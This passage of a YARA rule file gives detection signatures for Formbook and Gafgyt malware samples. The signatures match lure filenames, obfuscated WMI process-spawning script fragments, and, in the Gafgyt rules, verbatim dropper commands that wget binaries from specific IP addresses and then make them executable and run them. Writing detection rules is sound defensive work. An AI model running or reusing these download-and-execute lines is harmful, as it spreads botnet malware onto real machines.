      hash1 = "0f95fa77dab6ce7c91585962577b1d5a13792c1cc4afbb04d886b96995f88329"
   strings:
      $s1 = " DHL_7348995142_793402-124738.exe" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__2f6feb98 {
   meta:
      description = "_subset_batch - file Formbook(signature)_2f6feb98.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2f6feb98f0e420d15c2107d06541f12d749006afc7652dd3ad7f246111f49b6a"
   strings:
      $s1 = "DHL_7348995142_79340.exe" fullword ascii /* score: '16.00'*/
      $s2 = "TBDbo.mUB" fullword ascii /* score: '10.00'*/
      $s3 = "Ftpmdl" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      all of them
}

rule Formbook_signature__b6f01552 {
   meta:
      description = "_subset_batch - file Formbook(signature)_b6f01552.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b6f01552a728329bfe2c064ab6b33bf774e730efe1ad9824829a1dfe2620a27e"
   strings:
      $s1 = "Shipping TTA - 9189182025- Document D129500.exe" fullword ascii /* score: '30.00'*/
      $s2 = "Shipping TTA - 9189182025- Document D129500.exePK" fullword ascii /* score: '19.00'*/
      $s3 = "|VJwZ* \\" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__2158a255 {
   meta:
      description = "_subset_batch - file Formbook(signature)_2158a255.r09"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2158a255474eab9003f31a5dad938a9ebf6bf5e30eb066395d58ccde2d7b1791"
   strings:
      $s1 = "PURCHASE ORDER LPO 2674853.bat" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 40KB and
      all of them
}

rule Formbook_signature__452bce7b {
   meta:
      description = "_subset_batch - file Formbook(signature)_452bce7b.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "452bce7ba0ed3999c2cf8ee225841e54da1767fc4104a7e099bc420f45c88865"
   strings:
      $s1 = "P. O. 2181285.exe" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__7b1b9cb4 {
   meta:
      description = "_subset_batch - file Formbook(signature)_7b1b9cb4.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7b1b9cb4d253c2ef43ab03fd4d189df190a040b55fd3f102314e0a2f0a9de545"
   strings:
      $s1 = "PO88140069.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__347643b5 {
   meta:
      description = "_subset_batch - file Formbook(signature)_347643b5.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "347643b57afc2970d3e5db720267674c587bdff370088abc2fa3203f28747a49"
   strings:
      $s1 = "        var echinocandin = shants.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '17.00'*/
      $s2 = "        var capek = shants.Get(\"Win32_Process\");" fullword ascii /* score: '14.00'*/
      $s3 = "        this[\"postmodifiers\"] = this[\"yogalike\"].GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
      $s4 = "g('\" + this[\"tragelaphus\"] + \"'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule Formbook_signature__41a940a0 {
   meta:
      description = "_subset_batch - file Formbook(signature)_41a940a0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "41a940a0b8e89ef3b25c3f717c40ff3cec827605dd1f577731bd9a58be197741"
   strings:
      $s1 = "6 {&}9\"~" fullword ascii /* score: '9.00'*/ /* hex encoded string 'i' */
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule Formbook_signature__41d4f016 {
   meta:
      description = "_subset_batch - file Formbook(signature)_41d4f016.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "41d4f016b8d1d2c37a888294b8c7be7c9f89ebc787c5c391053a589f9ab2eeb5"
   strings:
      $s1 = "Project Description.vbe" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__4a606b04 {
   meta:
      description = "_subset_batch - file Formbook(signature)_4a606b04.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4a606b043ab7b33ec41d5966244632a4fbb3dd96fe4fd0890236a6a8946027d1"
   strings:
      $s1 = "Requirements.exe" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__515c92cc {
   meta:
      description = "_subset_batch - file Formbook(signature)_515c92cc.z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "515c92cc4ff4198316590fcd5249a9971cbd8ae568ec8d6004f559d03c068318"
   strings:
      $s1 = "%PROOF OF PAYMENT AS OF 13-05-2025.exe" fullword ascii /* score: '19.00'*/
      $s2 = "GIOg:\"VA&R" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__56c651c2 {
   meta:
      description = "_subset_batch - file Formbook(signature)_56c651c2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "56c651c28b36f2c00317dbf99a1808941959c34ec6f966c47f9f724fa7e37e8c"
   strings:
      $s1 = "+RISe!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule Formbook_signature__57ce4128 {
   meta:
      description = "_subset_batch - file Formbook(signature)_57ce4128.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "57ce4128889f2b9a9cb291fc0f5d8e1ab6124e3a48f49a4de7f9670d6b7c9e31"
   strings:
      $s1 = "msedge_elf.dll" fullword ascii /* score: '20.00'*/
      $s2 = "01CHQ.exe" fullword ascii /* score: '19.00'*/
      $s3 = "+renjW:\\" fullword ascii /* score: '10.00'*/
      $s4 = "%tbUF%/$" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 6000KB and
      all of them
}

rule Formbook_signature__773cf00c {
   meta:
      description = "_subset_batch - file Formbook(signature)_773cf00c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "773cf00cd78d58e4afb934bbe17910b2e2f140d44446b6dd70c740098896fc47"
   strings:
      $s1 = "irciE@v" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule Formbook_signature__7ecce385 {
   meta:
      description = "_subset_batch - file Formbook(signature)_7ecce385.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7ecce385b0d9046e021ffd28d154bceeaf24b500e7104c8a7ccdab570d28560c"
   strings:
      $s1 = "QUOTATION 20232789.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__a1a9ef07 {
   meta:
      description = "_subset_batch - file Formbook(signature)_a1a9ef07.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a1a9ef07a808a85d00d62d44a9ab25ff6994c1a9a05af11ec9bef5e75e440a20"
   strings:
      $s1 = "Spreadsheet.exe" fullword ascii /* score: '25.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__aba89014 {
   meta:
      description = "_subset_batch - file Formbook(signature)_aba89014.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aba8901451837996b41d04c1c3e577855be1726cede1125e743770f91133152d"
   strings:
      $s1 = "Advance Payment.exe" fullword ascii /* score: '19.00'*/
      $s2 = "ExECZR^" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__b7ed7b74 {
   meta:
      description = "_subset_batch - file Formbook(signature)_b7ed7b74.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b7ed7b74e1b9e0de338a82bea1719d6d7369110941c522a9a6161b1cac405a87"
   strings:
      $s1 = "        var airgap = rodman.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s2 = "        var Meleagrididae = rodman.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s3 = "        this[\"overply\"] = this[\"cryaesthesia\"].GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
      $s4 = "g('\" + this[\"tautomerism\"] + \"'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule Formbook_signature__bec14bce {
   meta:
      description = "_subset_batch - file Formbook(signature)_bec14bce.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bec14bce5c4f442698374702e7759be6322af509b4f22b7cd64229df85fbb7dc"
   strings:
      $s1 = "shIt|IF" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule Formbook_signature__ccb78a57 {
   meta:
      description = "_subset_batch - file Formbook(signature)_ccb78a57.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ccb78a5780fbadac151f266883ebbce2f69d1acb603d377ecb25912163231e6e"
   strings:
      $s1 = "        var corrido = steroidogenic.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s2 = "        var raiked = steroidogenic.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s3 = "        this[\"bioadhesive\"] = this[\"kittywampus\"].GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
      $s4 = "g('\" + this[\"disfavor\"] + \"'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule Formbook_signature__e727b08f {
   meta:
      description = "_subset_batch - file Formbook(signature)_e727b08f.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e727b08feb947c962f8a6bdf93eb5af719a974bb05980f666f4bb202f6a8518a"
   strings:
      $s1 = "        var cyclometopa = balladier.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s2 = "        var polypectomy = balladier.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s3 = "        this[\"petrosulfol\"] = this[\"nestohedra\"].GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule Formbook_signature__ea08275e {
   meta:
      description = "_subset_batch - file Formbook(signature)_ea08275e.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ea08275e6dcb4db571779f47d36eb4be084b6b625311fdcdbd98f6557d452cdd"
   strings:
      $s1 = "PO31100045.exe" fullword ascii /* score: '19.00'*/
      $s2 = "* uS0$" fullword ascii /* score: '9.00'*/
      $s3 = "Tfky8 -" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Ga_gyt_signature_ {
   meta:
      description = "_subset_batch - file Ga-gyt(signature).sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "438628e3329369e161cbd8859706e835dd64bca8e6e5a5d0d1f0c6de34914be2"
   strings:
      $s1 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/mips; chmod +x mips; ./mips; rm -rf mips" fullword ascii /* score: '30.00'*/
      $s2 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/x86; chmod +x x86; ./x86; rm -rf x86" fullword ascii /* score: '30.00'*/
      $s3 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/co; chmod +x co; ./co; rm -rf co" fullword ascii /* score: '30.00'*/
      $s4 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/ppc; chmod +x ppc; ./ppc; rm -rf ppc" fullword ascii /* score: '30.00'*/
      $s5 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/mipsel; chmod +x mipsel; ./mipsel; rm -rf mi" ascii /* score: '30.00'*/
      $s6 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/arm61; chmod +x arm61; ./arm61; rm -rf arm61" ascii /* score: '30.00'*/
      $s7 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/586; chmod +x 586; ./586; rm -rf 586" fullword ascii /* score: '30.00'*/
      $s8 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/dss; chmod +x dss; ./dss; rm -rf dss" fullword ascii /* score: '30.00'*/
      $s9 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/dc; chmod +x dc; ./dc; rm -rf dc" fullword ascii /* score: '30.00'*/
      $s10 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/mipsel; chmod +x mipsel; ./mipsel; rm -rf mi" ascii /* score: '30.00'*/
      $s11 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/sh4; chmod +x sh4; ./sh4; rm -rf sh4" fullword ascii /* score: '30.00'*/
      $s12 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/m68k; chmod +x m68k; ./m68k; rm -rf m68k" fullword ascii /* score: '30.00'*/
      $s13 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/i686; chmod +x i686; ./i686; rm -rf i686" fullword ascii /* score: '30.00'*/
      $s14 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/scar; chmod +x scar; ./scar; rm -rf scar" fullword ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x652d and filesize < 4KB and
      8 of them
}

rule Ga_gyt_signature__18964716 {
   meta:
      description = "_subset_batch - file Ga-gyt(signature)_18964716.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1896471677b7350518e6253cf9e2cd2604f985bf1626cfaa0148bc09c7ef55f1"
   strings:
      $s1 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/s-h.4-.Sakura; chmod +x s-h.4-.Sakura; ./s-h" ascii /* score: '30.00'*/
      $s2 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/m-p.s-l.Sakura; chmod +x m-p.s-l.Sakura; ./m" ascii /* score: '30.00'*/
      $s3 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/a-r.m-4.Sakura; chmod +x a-r.m-4.Sakura; ./a" ascii /* score: '30.00'*/
      $s4 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/p-p.c-.Sakura; chmod +x p-p.c-.Sakura; ./p-p" ascii /* score: '30.00'*/
      $s5 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/m-i.p-s.Sakura; chmod +x m-i.p-s.Sakura; ./m" ascii /* score: '30.00'*/
      $s6 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/m-p.s-l.Sakura; chmod +x m-p.s-l.Sakura; ./m" ascii /* score: '30.00'*/
      $s7 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/a-r.m-6.Sakura; chmod +x a-r.m-6.Sakura; ./a" ascii /* score: '30.00'*/
      $s8 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/x-3.2-.Sakura; chmod +x x-3.2-.Sakura; ./x-3" ascii /* score: '30.00'*/
      $s9 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/a-r.m-6.Sakura; chmod +x a-r.m-6.Sakura; ./a" ascii /* score: '30.00'*/
      $s10 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/x-8.6-.Sakura; chmod +x x-8.6-.Sakura; ./x-8" ascii /* score: '30.00'*/
      $s11 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/x-8.6-.Sakura; chmod +x x-8.6-.Sakura; ./x-8" ascii /* score: '30.00'*/
      $s12 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/a-r.m-7.Sakura; chmod +x a-r.m-7.Sakura; ./a" ascii /* score: '30.00'*/
      $s13 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/p-p.c-.Sakura; chmod +x p-p.c-.Sakura; ./p-p" ascii /* score: '30.00'*/
      $s14 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/x-3.2-.Sakura; chmod +x x-3.2-.Sakura; ./x-3" ascii /* score: '30.00'*/
      $s15 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://67.159.18.115/a-r.m-7.Sakura; chmod +x a-r.m-7.Sakura; ./a" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x652d and filesize < 6KB and
      8 of them
}

rule Ga_gyt_signature__87a992d4 {
   meta:
      description = "_subset_batch - file Ga-gyt(signature)_87a992d4.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "87a992d4353aba0f4e2ba9fd5a6797de253be0e5beee2769bb2966819614ae86"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.154.80.50/aoxbot.ppc; chmod +x aoxbot.ppc; ./aoxbot.ppc; r" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.154.80.50/aoxbot.ppc; chmod +x aoxbot.ppc; ./aoxbot.ppc; r" ascii /* score: '33.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.154.80.50/aoxbot.x86; chmod +x aoxbot.x86; ./aoxbot.x86; r" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.154.80.50/aoxbot.sh4; chmod +x aoxbot.sh4; ./aoxbot.sh4; r" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.154.80.50/aoxbot.sh4; chmod +x aoxbot.sh4; ./aoxbot.sh4; r" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.154.80.50/aoxbot.ppc440fp; chmod +x aoxbot.ppc440fp; ./aox" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.154.80.50/aoxbot.arm7; chmod +x aoxbot.arm7; ./aoxbot.arm7" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.154.80.50/aoxbot.arm4; chmod +x aoxbot.arm4; ./aoxbot.arm4" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.154.80.50/aoxbot.ppc440fp; chmod +x aoxbot.ppc440fp; ./aox" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.154.80.50/aoxbot.arm6; chmod +x aoxbot.arm6; ./aoxbot.arm6" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.154.80.50/aoxbot.arm4; chmod +x aoxbot.arm4; ./aoxbot.arm4" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.154.80.50/aoxbot.mips; chmod +x aoxbot.mips; ./aoxbot.mips" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.154.80.50/aoxbot.i586; chmod +x aoxbot.i586; ./aoxbot.i586" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.154.80.50/aoxbot.mpsl; chmod +x aoxbot.mpsl; ./aoxbot.mpsl" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.154.80.50/aoxbot.i686; chmod +x aoxbot.i686; ./aoxbot.i686" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule Ga_gyt_signature__9614c7fc {
   meta:
      description = "_subset_batch - file Ga-gyt(signature)_9614c7fc.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9614c7fcec550ef5b595304791dee00ce8dbebf4d86da0af962b57c2b005bb96"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://205.185.121.141/586; chmod +x 586; ./586; rm -rf 586" fullword ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://205.185.121.141/arm61; chmod +x arm61; ./arm61; rm -rf arm61" fullword ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://205.185.121.141/dss; chmod +x dss; ./dss; rm -rf dss" fullword ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://205.185.121.141/mipsel; chmod +x mipsel; ./mipsel; rm -rf mip" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://205.185.121.141/ppc; chmod +x ppc; ./ppc; rm -rf ppc" fullword ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://205.185.121.141/x86; chmod +x x86; ./x86; rm -rf x86" fullword ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://205.185.121.141/dc; chmod +x dc; ./dc; rm -rf dc" fullword ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://205.185.121.141/mips; chmod +x mips; ./mips; rm -rf mips" fullword ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://205.185.121.141/i686; chmod +x i686; ./i686; rm -rf i686" fullword ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://205.185.121.141/m68k; chmod +x m68k; ./m68k; rm -rf m68k" fullword ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://205.185.121.141/co; chmod +x co; ./co; rm -rf co" fullword ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://205.185.121.141/sh4; chmod +x sh4; ./sh4; rm -rf sh4" fullword ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://205.185.121.141/mipsel; chmod +x mipsel; ./mipsel; rm -rf mip" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://205.185.121.141/scar; chmod +x scar; ./scar; rm -rf scar" fullword ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 4KB and
      8 of them
}

rule Ga_gyt_signature__bf85cf48 {
   meta:
      description = "_subset_batch - file Ga-gyt(signature)_bf85cf48.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bf85cf48edf432a86843439e1f3f4744bfd023dfb2931f1cbc512112c15145a9"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 hidakibest.ppc;wget http://103.118.28.144/hidakibest.ppc; chmod " ascii /* score: '37.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 hidakibest.ppc;wget http://103.118.28.144/hidakibest.ppc; chmod " ascii /* score: '37.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 hidakibest.mpsl;wget http://103.118.28.144/hidakibest.mpsl; chmo" ascii /* score: '34.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 hidakibest.arm5;wget http://103.118.28.144/hidakibest.arm5; chmo" ascii /* score: '34.00'*/
      $x5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 hidakibest.mips;wget http://103.118.28.144/hidakibest.mips; chmo" ascii /* score: '34.00'*/
      $x6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 hidakibest.arm4;wget http://103.118.28.144/hidakibest.arm4; chmo" ascii /* score: '34.00'*/
      $x7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 hidakibest.arm7;wget http://103.118.28.144/hidakibest.arm7; chmo" ascii /* score: '34.00'*/
      $x8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 hidakibest.x86;wget http://103.118.28.144/hidakibest.x86; chmod " ascii /* score: '34.00'*/
      $x9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 hidakibest.arm6;wget http://103.118.28.144/hidakibest.arm6; chmo" ascii /* score: '34.00'*/
      $x10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 hidakibest.sparc;wget http://103.118.28.144/hidakibest.sparc; ch" ascii /* score: '34.00'*/
      $x11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 hidakibest.x86;wget http://103.118.28.144/hidakibest.x86; chmod " ascii /* score: '34.00'*/
      $x12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 hidakibest.mips;wget http://103.118.28.144/hidakibest.mips; chmo" ascii /* score: '31.00'*/
      $x13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 hidakibest.arm4;wget http://103.118.28.144/hidakibest.arm4; chmo" ascii /* score: '31.00'*/
      $x14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 hidakibest.arm7;wget http://103.118.28.144/hidakibest.arm7; chmo" ascii /* score: '31.00'*/
      $x15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 hidakibest.arm5;wget http://103.118.28.144/hidakibest.arm5; chmo" ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 5KB and
      1 of ($x*)
}

rule Ga_gyt_signature__c35de573 {
   meta:
      description = "_subset_batch - file Ga-gyt(signature)_c35de573.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c35de573bdd1359f9c93121cfe007d3f6897eabcb091775fab2b0832e10159c4"
   strings:
      $s1 = "Killed process: " fullword ascii /* score: '15.00'*/
      $s2 = "/home/process/" fullword ascii /* score: '15.00'*/
      $s3 = "/usr/libexec/" fullword ascii /* score: '12.00'*/
      $s4 = "/system/system/bin/" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Ga_gyt_signature__cc9a945d {
   meta:
      description = "_subset_batch - file Ga-gyt(signature)_cc9a945d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cc9a945d9470e54b97488ff0b602b65e59264887dccb91ba306963fcc5d7846d"
   strings:
      $s1 = "Killed process: " fullword ascii /* score: '15.00'*/
      $s2 = "/home/process/" fullword ascii /* score: '15.00'*/
      $s3 = "/usr/libexec/" fullword ascii /* score: '12.00'*/
      $s4 = "/system/system/bin/" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Ga_gyt_signature__d02a342e {
   meta:
      description = "_subset_batch - file Ga-gyt(signature)_d02a342e.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d02a342e53cd98fe331a475c772199ca55896d254cf1d39571c2d92721a9705d"
   strings:
      $s1 = "wget http://158.94.209.216/ui686 -O utt; chmod 777 utt; ./utt utt.webs;" fullword ascii /* score: '24.00'*/
      $s2 = "wget http://158.94.209.216/uppc -O utt; chmod 777 utt; ./utt utt.webs;" fullword ascii /* score: '24.00'*/
      $s3 = "wget http://158.94.209.216/umpsl -O utt; chmod 777 utt; ./utt utt.webs;" fullword ascii /* score: '24.00'*/
      $s4 = "wget http://158.94.209.216/umips -O utt; chmod 777 utt; ./utt utt.webs;" fullword ascii /* score: '24.00'*/
      $s5 = "cd /tmp; rm utt;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule Ga_gyt_signature__f99f9696 {
   meta:
